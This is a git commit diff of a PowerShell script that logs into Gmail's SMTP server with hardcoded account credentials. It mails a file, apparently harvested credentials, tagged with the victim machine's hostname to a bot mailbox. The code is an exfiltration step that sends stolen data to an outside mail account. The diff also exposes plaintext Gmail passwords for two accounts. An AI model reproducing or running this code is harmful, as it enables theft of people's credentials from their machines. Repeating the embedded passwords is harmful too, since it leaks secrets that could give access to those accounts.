21210601de06bbe073930c8b4516657de76dbdb5
Luis Perez Morales <61613934+lperezmo@users.noreply.github.com>
2022-09-21 20:17:04 -0500

    Update test3.ps1

--- Based-on-yagmail/test3.ps1
+++ Based-on-yagmail/test3.ps1
@@ -1,9 +1,9 @@
 $SMTPServer = 'smtp.gmail.com'
 $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
 $SMTPInfo.EnableSsl = $true
-$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('jerrycarre4444@gmail.com', 'ourkindoftraitor')
+$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('hess.email.bot@gmail.com', 'chflqnyjdhtbiyvw')
 $ReportEmail = New-Object System.Net.Mail.MailMessage
-$ReportEmail.From = 'jerrycarre4444@gmail.com'
+$ReportEmail.From = 'hess.email.bot@gmail.com'
 $ReportEmail.To.Add('hess.email.bot@gmail.com')
 $ReportEmail.Subject = 'Credentials - ' + [System.Net.Dns]::GetHostByName(($env:computerName)).HostName
 $ReportEmail.Attachments.Add("$output")
